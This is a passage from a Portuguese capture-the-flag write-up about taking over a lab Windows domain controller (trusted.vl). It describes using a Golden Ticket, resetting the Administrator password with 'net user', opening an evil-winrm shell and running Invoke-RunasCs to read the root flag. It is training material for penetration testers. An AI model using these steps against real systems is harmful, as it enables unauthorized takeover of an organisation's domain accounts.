10.10.173.230	LABDC.lab.trusted.vl lab.trusted.vl
            </pre>

            <p>
                O Golden Ticket foi usado para autenticar e executar comandos em <b>trusteddc.trusted.vl</b>:
            </p>
            <center><img src="execgolden.png" alt="" width="70%"></center>
            <p>trocamos a senha do Admin e podemos fazer login pelo <b>evil-wrinrm</b></p>

            <pre>
<b>whoami
nt authority\system

C:\temp> hostname
trusteddc

C:\temp> net user Administrator kernel123@
The command completed successfully.</b>
            </pre>
            <p>Evil-wrinrm</p>
            <pre>
<b>└─# evil-winrm -i trusted.vl -u Administrator -p 'kernel123@'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents></b>
            </pre>
            <h2>Bypass Read root.txt</h2>
            <p>Não conseguimos ler a flag de root …</p>
            <center><img src="flag.png" alt="" width="80%"></center>
            <p>para conseguirmos ler ela teremos quer usar o Runas</p>
            <a href="http://michalszalkowski.com/security/windows/tools/runascs/">Runas</a>
            <p>vamos upar para a maquina e fazer o bypass…</p>
            <pre><b>import-module .\Invoke-RunasCs.ps1</b></pre>
            <pre><b>Invoke-RunasCs Administrator "kernel123@" "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"</b></pre>
            <h2>Pwned!</h2>
                    <center><p>by Leonardo Kauan - krnl</p></center>
        </section>
        
    </main>

</body>


</html>
